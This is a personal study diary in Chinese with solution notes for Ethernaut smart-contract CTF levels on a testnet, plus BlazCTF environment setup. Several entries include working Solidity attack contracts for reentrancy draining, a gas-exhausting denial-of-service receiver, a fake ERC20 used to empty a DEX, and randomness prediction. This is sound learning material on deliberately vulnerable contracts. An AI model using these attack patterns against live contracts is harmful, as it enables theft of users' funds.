---
timezone: Asia/Shanghai
---
---

# yulai

1. 自我介绍
程序员一枚，喜欢编码和区块链
2. 你认为你会完成本次残酷学习吗？
70%概率吧
## Notes

<!-- Content_START -->

### 2024.08.29
#### Ethernaut - Hello Ethernaut
1. eth sepolia rpc: https://eth-sepolia.public.blastapi.io
2. 现在测试网水龙头变得麻烦了，要求主网要有余额。
水龙头：https://sepolia-faucet.pk910.de/#/
       https://www.alchemy.com/faucets/ethereum-sepolia
3. 测试1部署合约：0x480Ee5663698aA065B3c971722eda3e835ce024d
4. 根据教程一步步执行，最后通过 authenticate 方法提交答案
#### Ethernaut - Fallback
合约地址：0x086Bb5B1F286D04cB7e8D228c736b377D6E1d4D3
调用方法时发送eth: await contract.contribute({value: '100'})
直接发送eth: await contract.send('100')
##### 解题思路
1. 调用 contribute 方法时发送eth
```
await contract.contribute({value: '100'})
```
2. 直接发送 eth
```
await contract.send('100')
```
3. 调用 withdraw 方法
```
await contract.withdraw()
```
#### Ethernaut - Fallout
##### 解题思路
构造器名称写错，导致构造器方法变成了普通方法，可以被调用
1. 调用 Fal1out 方法
```
await contract.Fal1out()
```
#### Ethernaut - Telephone
学习如何在 Remix 中部署合约和调用合约
合约地址：0xB09803A34a73B056D3B39e3a8bf577DB075E70eC



### 2024.08.30
#### Ethernaut - Telephone
在 Remix 上部署一个合约，调用 Telephone 合约的 changeOwner方法
1. 需要学习下如何在Remix上部署和调用合约

#### Ethernaut - Token
使用溢出攻击。需要让另一个账号来给我们转账。
合约transfer中 require 有问题，会受到溢出攻击。
合约地址：0x7e74e1b56aE3F378866a0A71921Aea1f4EAe0343
1. 可以使用 remix 编译这个合约，然后在remix部署页面通过 atAddress 可以定义到这个合约
2. 使用另一个账号给开发账号转账 1个币

### 2024.08.31
#### Ethernaut - Delegation
合约地址：0xd969Ee8f7634454a2Deb8dF8C28B0D113D536f48
1. 有些奇怪。在remix上编译这个合约，通过地址识别实例发现是Delegate合约，而不是Delegation合约。Deletegate合约可以直接执行 pwn 方法完成owner转换。
2. 猜测remix 无法准确识别两个合约在一个文件的情况，加上两个合约结构类似，因此可以正常调用

#### Ethernaut - Force
没有合约代码，有点不太懂
合约地址：0x00a5b5d5717192AE7e982Ec80ea006f188ee70E3
1. 这道题的目的是学习如何强制往一个空合约中转账，一般转账都要求目标合约有实现相关方法或者fallback, receive函数
2. 可以通过合约的 selfdestruct 方法实现强制转账
3. 还可以通过挖矿奖励或者在合约部署之前给它转账的方式，实现强制转账
4. 解题思路就是部署一个新合约，给它转点币，再调用它的自毁方法把币强制转给目标合约

### 2024.09.01
#### Ethernaut - Vault
合约地址：0x723d210fD10CB30e4C26e3E74C175d035B41383C </br>
学习如何访问合约中的 private 变量。可以通过 web3.js的方法查询
```
await web3.eth.getStorageAt(instance, 1)
```
获得值：0x412076657279207374726f6e67207365637265742070617373776f7264203a29 <br>
解析出来是：A very strong secret password :) <br>
值得一提的另一个解题方法是，直接反编译创建合约的字节码，也发现了： `'A very strong secret password :)'`，只是一开始以为是没用的注释，就没使用:)

#### Ethernaut - King
合约地址：0x7237a19220B624692cDC7b102204C36Cfc23B53e
本题学习如何构造一个不接收转账的合约。
1. 一开始正常往合约转了0.002eth，提交题目。发现被重置了king
2. 题目中会用到 king的transfer功能，因此可以构造一个合约来给目标合约转账，新合约会成为king。但是由于新合约无法接收转账，因此提交题目时不会出现1种的重置
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address king) payable {
        (bool success, ) = king.call{value: 0.002 ether}("");
        require(success, "call false");
    }

}
```

### 2024.09.02
#### Ethernaut - Re-entrancy
合约地址：0x84841B92767187f235B67690Db1179f7E6307faC
可以对 withdraw 使用重入攻击
需要特别注意，重入攻击不能放在 constructor 中。因为在创建合约时，fallback/receive函数内容可能还没有被初始化，会是空的
```
contract AttackReentracy {
    address payable public  _reentracy;
    address payable public _owner;

    constructor( address payable reentracy, address payable owner) public payable {
        _reentracy = reentracy;
        _owner = owner;
    }

    function withdraw() external payable {
        // 1. 往目标合约捐款
        Reentrance(_reentracy).donate{value: 0.001 ether}(address(this));
        // 2. 调用目标合约取款
        Reentrance(_reentracy).withdraw(1000000000000000);
        // 3. 给owner转账
        payable(_owner).transfer(address(this).balance);
    }

    fallback() external payable { 
        Reentrance(_reentracy).withdraw(1000000000000000);
    }

    receive() external payable {
        Reentrance(_reentracy).withdraw(1000000000000000);
    }
}
```
### 2024.09.03
#### Ethernaut - Elevator
合约地址：0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
题目要求构造一个合约，并且在一次交易的两次调用中，返回不同的值
```
contract BuildingImpl is Building {
    uint public top = 0;
    
    function isLastFloor(uint256) external returns (bool) {
        top++;
        return top == 2;
    }

    // 0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
    function attack(address elevator) external   {
        Elevator elevatorContract = Elevator(elevator);
        elevatorContract.goTo(1);
    }
}
```

### 2024.09.04
#### Ethernaut - Privacy
Vault 的进阶版，需要通过web3js获取存储的数据，需要学习下evm中是如何存储数据的
合约地址：0x57c70Fd38b1D9B453013EF0b6021B926EA131E6e

### 2024.09.05
#### Ethernaut - Shop
可以实现一个动态的 被调用函数
合约地址：0x2eafa118534F7B4652d7e7Ee5e2d6146d32E620e
```
contract BuyerImpl {
    address public shopAddress;
    
    constructor() {}
    
    function setShopAddress(address _shopAddress) public  {
        shopAddress = _shopAddress;
    }

    function payForShop(address _shopAddress) payable public {
        Shop _shop = Shop(_shopAddress);
        _shop.buy();
    }

    function price() external view returns (uint256) {
        Shop _shop = Shop(shopAddress);
        if (_shop.isSold()) {
            return 1;
        }
        return 101;
    }
}
```

### 2024.09.06
#### Ethernaut - Naught Coin
单纯看合约没啥问题，不过合约继承了 ERC20 合约，该合约还有其它转账的方法，比如 TransferFrom
可以用 TransferFrom 进行转账，不会走到 lockTokens 的逻辑

### 2024.09.07
#### Ethernaut - Recovery
不是很懂这题要考察什么？考察如何提前计算合约地址？反正是从浏览器中找到了合约地址，调用了自毁方法，就通过了...

### 2024.09.08
#### Ethernaut - Dex
这题的 getSwapPrice 方法有问题，会用交易前的价格执行整个交易，实际交易时会有滑点问题。
只需要不断用一种资产换另一种资产，再用另一种资产换回原来资产这种方式，就能消耗完 Dex 中所有代表

### 2024.09.09
#### Ethernaut - DexTwo
根据题目提示，能够发现 Dex 合约在进行swap时，没有判断交易的是否是题目创建的两个合约。
我们能够构建一个有问题的合约，去把 Dex 创建的两个代币合约中的代币偷出来。
实例地址：0xEd4F4dDf2D09A4c3b98bC8176970329a9cA4943E
```
contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }

    function balanceOf(address account) public pure override  returns (uint256) {
        return uint256(1);
    }
}
```

### 2024.09.10
#### Ethernaut - Coin Flip
可以部署一个合约，提前算出这个回合的值，然后再调用目标合约
实例地址：0xC4942cA0C3cF779AE244026Bd5768a79bC93FA91
```
contract AttackCoinFlip {
    CoinFlip flip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _flip) {
        flip = CoinFlip(_flip);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool res = flip.flip(side);
        if (!res) {
            revert();
        }
    }
}
```
### 2024.09.11
#### Ethernaut - Denial
题目专门提示了 gas 费不超过 1M。然后看下合约，通过 call 方法调用 partner。
call 会默认调用partner的 receive方法，只需要目标合约的 receive 方法为死循环，就能让 withdraw 方法失效。
实例地址：0x91c906F8d655A90601805B71745f454742c38632
```
contract AttackDenial {
    receive() external payable {
        for (uint256 i = 1; i<10000000000; i++) {
            if (i == 100) {
                i = 10;
            }
        }
    }
}
```

### 2024.09.12
#### Ethernaut - Stake
合约的目的，是 总余额大于 eth 余额，只要往里面质押 weth 就好了。但是我们并没有 weth，这时观察合约，可以发现 StakeWETH 方法没有检查 transferFrom 方法的返回值，因此只要有授权，转账失败也没关系。
1. 使用另一个账号质押 eth
2. 调用 weth 合约的 approve 方法增加授权
3. 调用 StakeWETH 质押 weth，注意数额要比1大，实际并没有质押
4. 调用 Unstake，将所有数量取出
实例地址：0x8F4BDfE756B27102E891B9fC1F623c1c1138279C

### 2024.09.13
#### Ethernaut - Good Samaritan
可以发现，Good Samaritan 会在 Wallet 抛出 NotEnoughBalance 错误时，把所有资产都转给调用者。同时 Wallet 底层的 Coin 会在转账时，调用对方的 notify 方法。我们只需要在 notify 中实现 抛出 NotEnoughBalance 错误就行。
需要注意，为了防止 Good Samaritan 在将所有资产都转给调用合约时，也触发 notify 方法，需要结合 notify 的入参的进行判断。
地址实例：0x4920eBb362bdBa68bfC548F34faaAa86A6C828D1
```
contract AttackGoodSamaritan is INotifyable {
    error NotEnoughBalance();
    
    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function requestDonation(address d) public  {
        GoodSamaritan(d).requestDonation();
    }
}
```


### 2024.09.14
#### Ethernaut - Gatekeeper Three
满足题目的三个 modifier，就可以成为参赛者。
实例地址：0x784872141affcfD443a6f43093Ed81B0BB6d6D04
```
contract AttackGatekeeperThree {
    address public gateAddr;

    constructor(address addr) {
        gateAddr = addr;
    }

    error Error1();

    function setConstruct0r() public {
        GatekeeperThree(payable (gateAddr)).construct0r();
    }

    function getAllowance() public {
        uint256 t = block.timestamp;
        GatekeeperThree(payable (gateAddr)).getAllowance(t);
        GatekeeperThree(payable (gateAddr)).getAllowance(t);
    }

    function setEnter() public {
        GatekeeperThree(payable (gateAddr)).enter();
    }

    receive() external payable {
        revert Error1();
    }
}
```

### 2024.09.15
#### Ethernaut - GateKeeper One
要满足几个条件才能通过题目。
分析条件一，对于uint64,需要高32位不为0，低16位和tx.origin的低16位相同，中间16位为0
条件二，通过循环暴力做出来了。可以在调用 enter 时可以通过 gas 设置传递的 gas 费
实例地址：0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93
```
contract AttackGatekeeperOne {
    address public _gateAddr = 0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93;
    event Log(uint256 i, uint256 gas);
    bytes8 public gateKey2 = 0x000000010000a345;

    constructor() {}

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function getGateThree() public view returns (bytes8) {
        uint16 low16 = uint16(uint160(tx.origin));
        uint32 low32 = uint32(low16);
        uint64 _gateKey = (uint64(1) << 32) | uint64(low32);
        return bytes8(_gateKey);
    }

    function checkGateKey(bytes8 _gateKey) public gateThree(_gateKey) view returns (bool) {
        return true;
    }

    function getEnter(uint256 number) public  {
        bool successed = false;
        for (uint256 i = 500*number; i < 500*(number+1); i++) {
            if (successed) break;
            try GatekeeperOne(_gateAddr).enter{gas: 50000+i}(gateKey2) {
                emit Log(i, gasleft());
                successed = true;
            } catch {
            }
        }
        require(successed);
    }
}
```

### 2024.09.16
#### Ethernaut - GateKeeper Two
和 GateKeeper One 类似，需要过几个关卡
关卡1: 要求使用合约来调用 enter 方法
关卡2: 可以在合约的 constructor 方法中调用目标合约，这时候它还没有完成实例化，代码大小为 0
关卡3: 学习如何进行异步运算
实例地址：0x50d7242F965a27b97d15312b5370aF71079C1113
```
contract AttackGatekeeperTwo {
    constructor() {
        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
        address gateAddr = 0x50d7242F965a27b97d15312b5370aF71079C1113;
        GatekeeperTwo(gateAddr).enter(_gateKey);
    }
}
```
### 2024.09.17
#### blazctf2023 - rock scissor paper
今天开始了解 blazctf 活动如何参加，尝试部署题目的环境
1. 启动 基础服务器。需要注意网络问题
```
cd infrastucture/paradigmctf.py
docker-compose up -d
```
2. 启动题目相关的容器
```
cd challenges/rock-paper-scissor/challenge
docker-compose up -d
nc localhost 1337 
# 输入1创建题目实例
# 提示找不到 ghcr.io/foundry-rs/foundry:latest
docker pull --platform linux/amd64  ghcr.io/foundry-rs/foundry:latest
docker tag ghcr.io/foundry-rs/foundry:latest foundry:latest
nc localhost 1337 # 再次创建，成功。得到相关的 rpc 地址
```
3. 部署 blockscout。目前部署还有些问题，明天来解决

### 2024.09.18
#### ethernaut - MagicNumber
这道题考查对字节码的使用，不是很懂，去查询了相关文档
实例地址：0x08557A8d841ad88Eff166c08E1388dCbB1681bc1
发现字节码还是很厉害的

<!-- Content_END -->